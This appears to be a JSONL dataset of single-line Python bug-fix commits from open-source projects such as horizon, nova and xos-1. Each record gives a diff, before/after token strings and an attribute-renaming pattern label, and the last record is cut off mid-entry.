{"project": "knowledge-repo", "commit_sha": "8a6f36f371250ffe30c089934bb1d7f165acf668", "parent_sha": "92cccdaeb354330e52c7b9e5d09776421a24b50a", "file_path": "knowledge_repo/app/routes/tags.py", "project_url": "https://github.com/RasaHQ/knowledge-repo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -55,7 +55,7 @@ def render_batch_tags():\n             db_session.commit()\n \n         tags_to_posts[tag.id] = [(post.path, post.title) for post in posts if\n-                                 post.is_published and not post.contains_excluded_tags]\n+                                 post.is_published and not post.contains_excluded_tag]\n         nonzero_tags.append(tag)\n         # so that we can use the tag in the jinja template\n         db_session.expunge(tag)\n", "before": "tags_to_posts [ tag . id ] = [ ( post . path , post . title ) for post in posts if post . is_published and not post . contains_excluded_tags ]", "after": "tags_to_posts [ tag . id ] = [ ( post . path , post . title ) for post in posts if post . is_published and not post . contains_excluded_tag ]", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:contains_excluded_tags\", 3, 65, 3, 87], \"contains_excluded_tag\"]]"}
{"project": "strax", "commit_sha": "c8bffd213fee390b4f737927018dcb5abc361ea2", "parent_sha": "9a06d67926195a48084e1c118876dd522345ef8a", "file_path": "strax/dtypes.py", "project_url": "https://github.com/AxFoundation/strax", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -128,7 +128,7 @@ def peak_dtype(n_channels=100, n_sum_wv_samples=200, n_widths=11):\n         (('Peak widths: time between nth and 5th area decile [ns]',\n           'area_decile_from_midpoint'), np.float32, n_widths),\n         (('Does the channel reach ADC saturation?',\n-          'saturated_channel'), np.int16, n_channels),\n+          'saturated_channel'), np.bool_, n_channels),\n         (('Total number of saturated channels',\n           'n_saturated_channels'), np.int16),\n         (('Hits within tight range of mean',\n", "before": "( ( 'Does the channel reach ADC saturation?' , 'saturated_channel' ) , np . int16 , n_channels ) ,", "after": "( ( 'Does the channel reach ADC saturation?' , 'saturated_channel' ) , np . bool_ , n_channels ) ,", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:int16\", 3, 36, 3, 41], \"bool_\"]]"}
{"project": "graphtools", "commit_sha": "912bdaa643aba7eecb97c543b3478f781503d0cf", "parent_sha": "defb01e7edcdb7763bdf5b76497f85cdab1d3d7e", "file_path": "test/test_mnn.py", "project_url": "https://github.com/KrishnaswamyLab/graphtools", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -91,7 +91,7 @@ def test_mnn_graph_float_gamma():\n     assert np.all(G.d == G2.d), \"{} ({}, {})\".format(\n         np.where(G.d != G2.d),\n         G.d[np.argwhere(G.d != G2.d).reshape(-1)],\n-        G.d2[np.argwhere(G.d != G2.d).reshape(-1)])\n+        G.d[np.argwhere(G.d != G2.d).reshape(-1)])\n     assert (G.W != G2.W).nnz == 0\n     assert (G2.W != G.W).sum() == 0\n     assert isinstance(G2, graphtools.graphs.MNNGraph)\n", "before": "assert np . all ( G . d == G2 . d ) , \"{} ({}, {})\" . format ( np . where ( G . d != G2 . d ) , G . d [ np . argwhere ( G . d != G2 . d ) . reshape ( - 1 ) ] , G . d2 [ np . argwhere ( G . d != G2 . d ) . reshape ( - 1 ) ] )", "after": "assert np . all ( G . d == G2 . d ) , \"{} ({}, {})\" . format ( np . where ( G . d != G2 . d ) , G . d [ np . argwhere ( G . d != G2 . d ) . reshape ( - 1 ) ] , G . d [ np . argwhere ( G . d != G2 . d ) . reshape ( - 1 ) ] )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:d2\", 3, 11, 3, 13], \"d\"]]"}
{"project": "graphtools", "commit_sha": "a727b822565ef634df98fd9ee9550725ad3acc8a", "parent_sha": "912bdaa643aba7eecb97c543b3478f781503d0cf", "file_path": "test/test_mnn.py", "project_url": "https://github.com/KrishnaswamyLab/graphtools", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -147,7 +147,7 @@ def test_mnn_graph_matrix_gamma():\n     assert np.all(G.d == G2.d), \"{} ({}, {})\".format(\n         np.where(G.d != G2.d),\n         G.d[np.argwhere(G.d != G2.d).reshape(-1)],\n-        G.d2[np.argwhere(G.d != G2.d).reshape(-1)])\n+        G.d[np.argwhere(G.d != G2.d).reshape(-1)])\n     assert (G.W != G2.W).nnz == 0\n     assert (G2.W != G.W).sum() == 0\n     assert isinstance(G2, graphtools.graphs.MNNGraph)\n", "before": "assert np . all ( G . d == G2 . d ) , \"{} ({}, {})\" . format ( np . where ( G . d != G2 . d ) , G . d [ np . argwhere ( G . d != G2 . d ) . reshape ( - 1 ) ] , G . d2 [ np . argwhere ( G . d != G2 . d ) . reshape ( - 1 ) ] )", "after": "assert np . all ( G . d == G2 . d ) , \"{} ({}, {})\" . format ( np . where ( G . d != G2 . d ) , G . d [ np . argwhere ( G . d != G2 . d ) . reshape ( - 1 ) ] , G . d [ np . argwhere ( G . d != G2 . d ) . reshape ( - 1 ) ] )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:d2\", 3, 11, 3, 13], \"d\"]]"}
{"project": "graphtools", "commit_sha": "62acd69cdec71f1a0a6a6504c24920c9b2a1797b", "parent_sha": "3b5c2d0410d30e7ee86996eea9ef1eebc03453cd", "file_path": "test/test_data.py", "project_url": "https://github.com/KrishnaswamyLab/graphtools", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -54,7 +54,7 @@ def test_pandas_dataframe():\n def test_pandas_sparse_dataframe():\n     G = build_graph(pd.SparseDataFrame(data))\n     assert isinstance(G, graphtools.base.BaseGraph)\n-    assert isinstance(G.data, sp.coo_matrix)\n+    assert isinstance(G.data, sp.csr_matrix)\n \n \n #####################################################\n", "before": "assert isinstance ( G . data , sp . coo_matrix )", "after": "assert isinstance ( G . data , sp . csr_matrix )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:coo_matrix\", 3, 34, 3, 44], \"csr_matrix\"]]"}
{"project": "dlhub_sdk", "commit_sha": "0d674dde3acd905a9a44b1ce585d8ceba1741411", "parent_sha": "8019dcc440d15501322d992fb8f5b1b0b2ce138b", "file_path": "dlhub_toolbox/models/servables/sklearn.py", "project_url": "https://github.com/DLHub-Argonne/dlhub_sdk", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -110,7 +110,7 @@ class ScikitLearnModel(BaseServableModel):\n \n         # Store any special keyword arguments for the predict function\n         model_obj = model.steps[-1][-1] if self.pipeline else model\n-        predict_fun = model_obj.predict_proba if self.classifier else model_obj.predict_proba\n+        predict_fun = model_obj.predict_proba if self.classifier else model_obj.predict\n         spec = inspect.signature(predict_fun)\n         self.predict_options = dict((k, v.default) for k, v in spec.parameters.items() if k != \"X\")\n \n", "before": "predict_fun = model_obj . predict_proba if self . classifier else model_obj . predict_proba", "after": "predict_fun = model_obj . predict_proba if self . classifier else model_obj . predict", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:predict_proba\", 3, 81, 3, 94], \"predict\"]]"}
{"project": "cb4", "commit_sha": "d0cded5e6ffdb423248001d67618807a8ad56f72", "parent_sha": "496dc78cb8cccc33d2a1d98a40f2becc768bb25c", "file_path": "vj4/app.py", "project_url": "https://github.com/joint-online-judge/cb4", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -88,7 +88,7 @@ def connection_route(prefix, name):\n           await session.on_open()\n         elif msg.tp == sockjs.MSG_MESSAGE:\n           await session.on_message(**json.decode(msg.data))\n-        elif msg.tp == sockjs.MSG_CLOSE:\n+        elif msg.tp == sockjs.MSG_CLOSED:\n           await session.on_close()\n       except error.UserFacingError as e:\n         _logger.warning(\"Websocket user facing error: %s\", repr(e))\n", "before": "elif msg . tp == sockjs . MSG_CLOSE : await session . on_close ( )", "after": "elif msg . tp == sockjs . MSG_CLOSED : await session . on_close ( )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:MSG_CLOSE\", 3, 31, 3, 40], \"MSG_CLOSED\"]]"}
{"project": "cb4", "commit_sha": "d8edf783b86fcefe99f2d1def3c5acd76a032be8", "parent_sha": "47b60c5de637a8d75c44d7bcd0cb2755a4a80b55", "file_path": "vj4/handler/base.py", "project_url": "https://github.com/joint-online-judge/cb4", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -413,7 +413,7 @@ def route_argument(func):\n def get_argument(func):\n   @functools.wraps(func)\n   def wrapped(self, **kwargs):\n-    return func(self, **kwargs, **self.request.GET)\n+    return func(self, **kwargs, **self.request.query)\n \n   return wrapped\n \n", "before": "return func ( self , ** kwargs , ** self . request . GET )", "after": "return func ( self , ** kwargs , ** self . request . query )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:GET\", 3, 48, 3, 51], \"query\"]]"}
{"project": "repobee", "commit_sha": "7098c98c09039fa92f714218ecdac475e14ee494", "parent_sha": "88003949c55de8ea88eba1d7741de5ce079fa56b", "file_path": "repomate/github_api.py", "project_url": "https://github.com/repobee/repobee", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -123,7 +123,7 @@ class GitHubAPI:\n \n     @property\n     def token(self):\n-        return self.token\n+        return self._token\n \n     def get_teams_in(self, team_names: Iterable[str]\n                      ) -> Generator[github.Team.Team, None, None]:\n", "before": "return self . token", "after": "return self . _token", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:token\", 3, 21, 3, 26], \"_token\"]]"}
{"project": "erpnext-v7", "commit_sha": "4bc0f7d105c8073cb3cb0d6ff01db804fbd949f1", "parent_sha": "593d2e31463a2c748d1fc0bb4864ede6f86fec05", "file_path": "erpnext/schools/doctype/fee_structure/fee_structure.py", "project_url": "https://github.com/YefriTavarez/erpnext-v7", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -13,6 +13,6 @@ class FeeStructure(Document):\n \tdef calculate_total(self):\n \t\t\"\"\"Calculates total amount.\"\"\"\n \t\tself.total_amount = 0\n-\t\tfor d in self.amount:\n+\t\tfor d in self.components:\n \t\t\tself.total_amount += d.amount\n \t\n", "before": "for d in self . amount : self . total_amount += d . amount", "after": "for d in self . components : self . total_amount += d . amount", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:amount\", 3, 17, 3, 23], \"components\"]]"}
{"project": "erpnext-v7", "commit_sha": "fe913c9969b821d78dc1d247eed562d8d51f17d2", "parent_sha": "18d616293541d50faab547101051c91fa96d7c8b", "file_path": "erpnext/hr/doctype/salary_structure/salary_structure.py", "project_url": "https://github.com/YefriTavarez/erpnext-v7", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -99,7 +99,7 @@ def make_salary_slip(source_name, target_doc=None):\n \t\t\tfor d in source.get(key):\n \t\t\t\ttarget.append(key, {\n \t\t\t\t\t'amount': d.amount,\n-\t\t\t\t\t'default_amount': d.default_amount,\n+\t\t\t\t\t'default_amount': d.amount,\n \t\t\t\t\t'depends_on_lwp' : d.depends_on_lwp,\n \t\t\t\t\t'salary_component' : d.salary_component\n \t\t\t\t})\n", "before": "target . append ( key , { 'amount' : d . amount , 'default_amount' : d . default_amount , 'depends_on_lwp' : d . depends_on_lwp , 'salary_component' : d . salary_component } )", "after": "target . append ( key , { 'amount' : d . amount , 'default_amount' : d . amount , 'depends_on_lwp' : d . depends_on_lwp , 'salary_component' : d . salary_component } )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:default_amount\", 3, 26, 3, 40], \"amount\"]]"}
{"project": "XwareDesktop", "commit_sha": "d80b5be35147edf1983ba65c40a8c71936f72fdc", "parent_sha": "27974599210316414d8d8253ba2e3b339df1da30", "file_path": "src/frontend/launcher.py", "project_url": "https://github.com/mmczoo/XwareDesktop", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -34,7 +34,7 @@ class MainWindow(QMainWindow, Ui_MainWindow, Ui_SystemTray):\n         from PyQt5.QtWebKit import QWebSettings\n         if self.setting.get(\"frontend\", \"enableDevelopersTools\", \"False\") == \"True\":\n             self.webView.settings().setAttribute(QWebSettings.DeveloperExtrasEnabled, True)\n-        self.webView.loadFinished.connect(self.injectXwareJS)\n+        self.frame.loadFinished.connect(self.injectXwareJS)\n         self.frame.javaScriptWindowObjectCleared.connect(self.slotAddJSObject)\n         self.webView.urlChanged.connect(self.slotUrlChanged)\n \n", "before": "self . webView . loadFinished . connect ( self . injectXwareJS )", "after": "self . frame . loadFinished . connect ( self . injectXwareJS )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:webView\", 3, 14, 3, 21], \"frame\"]]"}
{"project": "XwareDesktop", "commit_sha": "935be8904aeef9e1b9a87b635b15d6da6de1097f", "parent_sha": "03198d43a5234f28af2f40a62d54250e69b4c018", "file_path": "src/frontend/MonitorWidget/MonitorWidget.py", "project_url": "https://github.com/mmczoo/XwareDesktop", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -10,7 +10,7 @@ class MonitorWidget(QWidget):\n     def __init__(self, parent = None):\n         super().__init__(parent)\n         self.setWindowFlags(Qt.FramelessWindowHint |\n-                            Qt.Tool |\n+                            Qt.ToolTip |\n                             Qt.WindowStaysOnTopHint)\n \n     def mousePressEvent(self, qMouseEvent):\n", "before": "self . setWindowFlags ( Qt . FramelessWindowHint | Qt . Tool | Qt . WindowStaysOnTopHint )", "after": "self . setWindowFlags ( Qt . FramelessWindowHint | Qt . ToolTip | Qt . WindowStaysOnTopHint )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:Tool\", 3, 32, 3, 36], \"ToolTip\"]]"}
{"project": "XwareDesktop", "commit_sha": "13180f4dc6c60c78e4fcf6e3176bcef8dd191b7d", "parent_sha": "e68cc36690d3424be815556d1687e1c67905a647", "file_path": "src/frontend/Schedule/__init__.py", "project_url": "https://github.com/mmczoo/XwareDesktop", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -85,7 +85,7 @@ class Scheduler(QObject):\n \n     @classmethod\n     def getActionName(cls, actionId):\n-        return cls.POSSIBLE_ACTIONS[actionId][1]\n+        return cls._ALL_POSSIBLE_ACTIONS[actionId][1]\n \n     def getSummary(self):\n         # return either True / False / str\n", "before": "return cls . POSSIBLE_ACTIONS [ actionId ] [ 1 ]", "after": "return cls . _ALL_POSSIBLE_ACTIONS [ actionId ] [ 1 ]", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:POSSIBLE_ACTIONS\", 3, 20, 3, 36], \"_ALL_POSSIBLE_ACTIONS\"]]"}
{"project": "DistAlgo", "commit_sha": "dfc5e37c1bec23f3c174300028c1da63bebcf880", "parent_sha": "ea4d0d3fdf2622044f4294f90753991de932de32", "file_path": "dpy/compiler/pygen.py", "project_url": "https://github.com/mayli/DistAlgo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -342,7 +342,7 @@ class PythonGenerator(NodeVisitor):\n         if node.entry_point is not None:\n             cd.body.extend(self.visit(node.entry_point))\n         cd.decorator_list = [self.visit(d) for d in node.decorators]\n-        cd.body.extend(self.body(node.body))\n+        cd.body.extend(self.body(node.methods))\n         cd.body.extend(self.generate_handlers(node))\n         return [cd]\n \n", "before": "cd . body . extend ( self . body ( node . body ) )", "after": "cd . body . extend ( self . body ( node . methods ) )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:body\", 3, 39, 3, 43], \"methods\"]]"}
{"project": "XwareDesktop", "commit_sha": "381eb72b80a0dc016f56ece52ba1e8ff03769aea", "parent_sha": "63fd65c1cbfc4afd08e4ff31f2d8d6f9ba5a88f1", "file_path": "src/frontend/xwaredpy.py", "project_url": "https://github.com/mmczoo/XwareDesktop", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -21,7 +21,7 @@ class XwaredPy(QObject):\n         super().__init__(app)\n         self.app = app\n \n-        self.app.lastWindowClosed.connect(self.stopXware)\n+        self.app.aboutToQuit.connect(self.stopXware)\n         self.startXware()\n         self._t = threading.Thread(target = self._watcherThread, daemon = True,\n                                    name = \"xwared/etm watch thread\")\n", "before": "self . app . lastWindowClosed . connect ( self . stopXware )", "after": "self . app . aboutToQuit . connect ( self . stopXware )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:lastWindowClosed\", 3, 18, 3, 34], \"aboutToQuit\"]]"}
{"project": "horizon", "commit_sha": "dd487f236db15fe6d6de76eb86fe98b75e2987b6", "parent_sha": "71b18da403b490f40e1a9838c050bc3a3eaf5ffa", "file_path": "openstack_dashboard/dashboards/admin/hypervisors/compute/tables.py", "project_url": "https://github.com/mkowalski/horizon", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -58,7 +58,7 @@ class ComputeHostFilterAction(tables.FilterAction):\n     def filter(self, table, services, filter_string):\n         q = filter_string.lower()\n \n-        return filter(lambda service: q in service.type.lower(), services)\n+        return filter(lambda service: q in service.host.lower(), services)\n \n \n class ComputeHostTable(tables.DataTable):\n", "before": "return filter ( lambda service : q in service . type . lower ( ) , services )", "after": "return filter ( lambda service : q in service . host . lower ( ) , services )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:type\", 3, 52, 3, 56], \"host\"]]"}
{"project": "horizon", "commit_sha": "59752b64560ad90065721f803a0f8dafc80a0250", "parent_sha": "5eae67fcaa127c4f04b205015eb487cc43b825ad", "file_path": "openstack_dashboard/dashboards/project/routers/ports/views.py", "project_url": "https://github.com/mkowalski/horizon", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -88,7 +88,7 @@ class SetGatewayView(forms.ModalFormView):\n     def get_initial(self):\n         router = self.get_object()\n         return {\"router_id\": self.kwargs['router_id'],\n-                \"router_name\": router.name}\n+                \"router_name\": router.name_or_id}\n \n \n class DetailView(tabs.TabView):\n", "before": "return { \"router_id\" : self . kwargs [ 'router_id' ] , \"router_name\" : router . name }", "after": "return { \"router_id\" : self . kwargs [ 'router_id' ] , \"router_name\" : router . name_or_id }", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:name\", 3, 39, 3, 43], \"name_or_id\"]]"}
{"project": "horizon", "commit_sha": "c7af83f22998f906d21539498b06b6fdd2e5c5e6", "parent_sha": "4daf99cb4c4fec7f11e8c783bede2dff9fbe7ba1", "file_path": "openstack_dashboard/dashboards/project/routers/ports/views.py", "project_url": "https://github.com/mkowalski/horizon", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -57,7 +57,7 @@ class AddInterfaceView(forms.ModalFormView):\n     def get_initial(self):\n         router = self.get_object()\n         return {\"router_id\": self.kwargs['router_id'],\n-                \"router_name\": router.name}\n+                \"router_name\": router.name_or_id}\n \n \n class SetGatewayView(forms.ModalFormView):\n", "before": "return { \"router_id\" : self . kwargs [ 'router_id' ] , \"router_name\" : router . name }", "after": "return { \"router_id\" : self . kwargs [ 'router_id' ] , \"router_name\" : router . name_or_id }", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:name\", 3, 39, 3, 43], \"name_or_id\"]]"}
{"project": "horizon", "commit_sha": "88674d0f3d0fb00c782e6bdc99ff67038a2ef490", "parent_sha": "876e27602754a28571d80cb73790abd510950b9c", "file_path": "openstack_dashboard/dashboards/admin/networks/agents/views.py", "project_url": "https://github.com/mkowalski/horizon", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -54,7 +54,7 @@ class AddView(forms.ModalFormView):\n         try:\n             network = api.neutron.network_get(self.request, network_id)\n             initial.update({\"network_id\": network_id,\n-                            \"network_name\": network.name,\n+                            \"network_name\": network.name_or_id,\n                             \"agents\": agents})\n             return initial\n         except Exception:\n", "before": "initial . update ( { \"network_id\" : network_id , \"network_name\" : network . name , \"agents\" : agents } )", "after": "initial . update ( { \"network_id\" : network_id , \"network_name\" : network . name_or_id , \"agents\" : agents } )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:name\", 3, 53, 3, 57], \"name_or_id\"]]"}
{"project": "nova", "commit_sha": "1ca37c4ca5812a318cec398a3196aefc17e72cb0", "parent_sha": "7193ff5466ca7ff485fbec64890d39cdadad7258", "file_path": "nova/tests/unit/virt/libvirt/test_vif.py", "project_url": "https://github.com/minditech/nova", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -691,7 +691,7 @@ class LibvirtVifTestCase(test.NoDBTestCase):\n         d = vif.LibvirtGenericVIFDriver()\n         with mock.patch.object(linux_net, 'delete_ivs_vif_port') as delete:\n             delete.side_effect = processutils.ProcessExecutionError\n-            d.unplug(self.instance, self.vif_ovs)\n+            d.unplug(self.instance, self.vif_ivs)\n \n     def _test_plug_ovs_hybrid(self, ipv6_exists):\n         calls = {\n", "before": "d . unplug ( self . instance , self . vif_ovs )", "after": "d . unplug ( self . instance , self . vif_ivs )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:vif_ovs\", 3, 42, 3, 49], \"vif_ivs\"]]"}
{"project": "odoo-academy", "commit_sha": "4c05fd35980f7f3c758fbd854bd73cdaa4032101", "parent_sha": "8b71389c5b49c41b1f4aaa0ca4afa154934dc1f7", "file_path": "modules/academy_tests/wizard/academy_tests_question_import_wizard.py", "project_url": "https://github.com/sotogarcia/odoo-academy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -460,7 +460,7 @@ class AcademyTestsQuestionImport(models.TransientModel):\n         # STEP 2: Try to find attachment by `name` field\n         if not record:\n             record = self.attachment_ids.filtered( \\\n-                lambda item: self._equal(item.datas_fname, uri))\n+                lambda item: self._equal(item.name, uri))\n \n         # STEP 3: Raise error if number of found items is not equal to one\n         if not record:\n", "before": "record = self . attachment_ids . filtered ( lambda item : self . _equal ( item . datas_fname , uri ) )", "after": "record = self . attachment_ids . filtered ( lambda item : self . _equal ( item . name , uri ) )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:datas_fname\", 3, 47, 3, 58], \"name\"]]"}
{"project": "xos-1", "commit_sha": "e43df4f0f3b98bef80aaf6ead044639b68216d58", "parent_sha": "16cbfab1b416e7eab88cc0ea5b41e1417847aa98", "file_path": "planetstack/core/dashboard/views/interactions.py", "project_url": "https://github.com/vpramo/xos-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -78,7 +78,7 @@ class DashboardSliceInteractions(View):\n                     if sp.user.id not in ids:\n                         ids.append(sp.user.id)\n         elif name==\"networks\":\n-            for sp in slice.networkslice_set.all():\n+            for sp in slice.networkslices.all():\n                     if sp.network.id not in ids:\n                         ids.append(sp.network.id)\n         elif name==\"sites\":\n", "before": "for sp in slice . networkslice_set . all ( ) : if sp . network . id not in ids : ids . append ( sp . network . id )", "after": "for sp in slice . networkslices . all ( ) : if sp . network . id not in ids : ids . append ( sp . network . id )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:networkslice_set\", 3, 29, 3, 45], \"networkslices\"]]"}
{"project": "xos-1", "commit_sha": "71dda3bc8030728180033ddd610332f6b7190d1e", "parent_sha": "1215424c4079c838127c8c5712a20376f49e7372", "file_path": "planetstack/core/models/sliver.py", "project_url": "https://github.com/vpramo/xos-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -106,7 +106,7 @@ class Sliver(PlCoreBase):\n             return u'unsaved-sliver'\n \n     def save(self, *args, **kwds):\n-        self.name = self.slice.slicename\n+        self.name = self.slice.name\n         if not self.creator and hasattr(self, 'caller'):\n             self.creator = self.caller\n \n", "before": "self . name = self . slice . slicename", "after": "self . name = self . slice . name", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:slicename\", 3, 32, 3, 41], \"name\"]]"}
{"project": "xos-1", "commit_sha": "c052e5fda03a89a5b588f77515958902af093afb", "parent_sha": "11a2f509fbba913430464781ead5995996a49eb4", "file_path": "planetstack/core/models/sliver.py", "project_url": "https://github.com/vpramo/xos-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -124,7 +124,7 @@ class Sliver(PlCoreBase):\n \n     def all_ips(self):\n         ips={}\n-        for ns in self.networksliver_set.all():\n+        for ns in self.networkslivers.all():\n            ips[ns.network.name] = ns.ip\n         return ips\n \n", "before": "for ns in self . networksliver_set . all ( ) : ips [ ns . network . name ] = ns . ip", "after": "for ns in self . networkslivers . all ( ) : ips [ ns . network . name ] = ns . ip", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:networksliver_set\", 3, 24, 3, 41], \"networkslivers\"]]"}
{"project": "xos-1", "commit_sha": "31683c80a911b530dc6beadd468d41a8d37e7c65", "parent_sha": "f77f14015dc30dd02d53d9bcc6682879d513dea6", "file_path": "planetstack/core/models/network.py", "project_url": "https://github.com/vpramo/xos-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -51,7 +51,7 @@ class Network(PlCoreBase):\n         super(Network, self).save(*args, **kwds)\n \n     def can_update(self, user):\n-        return self.slice.can_update(user)\n+        return self.owner.can_update(user)\n \n     @staticmethod\n     def select_by_user(user):\n", "before": "return self . slice . can_update ( user )", "after": "return self . owner . can_update ( user )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:slice\", 3, 21, 3, 26], \"owner\"]]"}
{"project": "xos-1", "commit_sha": "7347bcf42893bb092e72697e6e52cb85a93a9119", "parent_sha": "ae44e8ab4f91fefe4c6fd2edfe0a9cb429acdd92", "file_path": "xos/core/xoslib/methods/cordsubscriber.py", "project_url": "https://github.com/vpramo/xos-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -325,7 +325,7 @@ class CordSubscriberViewSet(XOSViewSet):\n \n         # reset the parental controls in any existing demo vCPEs\n         for o in object_list:\n-            if str(o.subscriber_specific_id) in [\"0\", \"1\"]:\n+            if str(o.service_specific_id) in [\"0\", \"1\"]:\n                 if o.vcpe is not None:\n                     self.setup_demo_vcpe(o)\n \n", "before": "if str ( o . subscriber_specific_id ) in [ \"0\" , \"1\" ] : if o . vcpe is not None : self . setup_demo_vcpe ( o )", "after": "if str ( o . service_specific_id ) in [ \"0\" , \"1\" ] : if o . vcpe is not None : self . setup_demo_vcpe ( o )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:subscriber_specific_id\", 3, 22, 3, 44], \"service_specific_id\"]]"}
{"project": "xos-1", "commit_sha": "db937c6528990d7a952d99065336ba64324acd56", "parent_sha": "fd897ee02fca585cf869bf17346940c82ad21d41", "file_path": "xos/tosca/resources/compute.py", "project_url": "https://github.com/vpramo/xos-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -78,7 +78,7 @@ class XOSCompute(XOSResource):\n         args[\"slice\"] = slice\n         args[\"flavor\"] = flavor\n         args[\"node\"] = compute_node\n-        args[\"deployment\"] = compute_node.site_deployment.d\n+        args[\"deployment\"] = compute_node.site_deployment.deployment\n \n         return args\n \n", "before": "args [ \"deployment\" ] = compute_node . site_deployment . d", "after": "args [ \"deployment\" ] = compute_node . site_deployment . deployment", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:d\", 3, 59, 3, 60], \"deployment\"]]"}
{"project": "xos-1", "commit_sha": "a731b0398fb6c4708d06a762b4a3d89335b2ed8e", "parent_sha": "ef2af0a1b785748c11dff4b02240eb133ecbc2ba", "file_path": "xos/vpn/admin.py", "project_url": "https://github.com/vpramo/xos-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -67,7 +67,7 @@ class VPNTenantForm(forms.ModelForm):\n \n     def save(self, commit=True):\n         self.instance.creator = self.cleaned_data.get(\"creator\")\n-        self.instance.servery_key = self.cleaned_data.get(\"sever_key\")\n+        self.instance.server_key = self.cleaned_data.get(\"sever_key\")\n         return super(VPNTenantForm, self).save(commit=commit)\n \n     def generate_VPN_Key():\n", "before": "self . instance . servery_key = self . cleaned_data . get ( \"sever_key\" )", "after": "self . instance . server_key = self . cleaned_data . get ( \"sever_key\" )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:servery_key\", 3, 23, 3, 34], \"server_key\"]]"}
{"project": "xos-1", "commit_sha": "fb58528eb6469275ce774177dbfef30aa9b7296c", "parent_sha": "684f5d67c62ba03af67fad476434a9f2e17f525c", "file_path": "xos/synchronizers/vpn/steps/sync_vpntenant.py", "project_url": "https://github.com/vpramo/xos-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -37,7 +37,7 @@ class SyncVPNTenant(SyncInstanceUsingAnsible):\n                 \"client_address\": o.client_address}\n \n     def create_client_script(self, tenant):\n-        script = open(\"/opt/xos/core/static/vpn/\" + str(tenant.file_name), 'w')\n+        script = open(\"/opt/xos/core/static/vpn/\" + str(tenant.script_name), 'w')\n         # write the key portion\n         script.write(\"printf \\\"\")\n         for line in tenant.server_key.splitlines():\n", "before": "script = open ( \"/opt/xos/core/static/vpn/\" + str ( tenant . file_name ) , 'w' )", "after": "script = open ( \"/opt/xos/core/static/vpn/\" + str ( tenant . script_name ) , 'w' )", "sstub_pattern": 